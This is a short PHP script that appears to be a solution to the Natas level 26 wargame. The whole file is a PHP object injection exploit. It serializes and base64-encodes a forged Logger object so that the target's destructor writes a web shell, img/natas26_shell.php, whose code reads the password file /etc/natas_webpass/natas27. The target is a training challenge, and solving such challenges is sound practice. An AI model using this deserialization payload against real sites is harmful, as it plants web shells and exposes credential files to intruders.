<?php
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="";
            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
            $this->logFile = "img/natas26_shell.php";
      
        }                                          
      
        function __destruct(){
        
        }                       
    }
    
    $logger = new Logger("");
    echo base64_encode(serialize($logger));
    echo "\n";
    
?>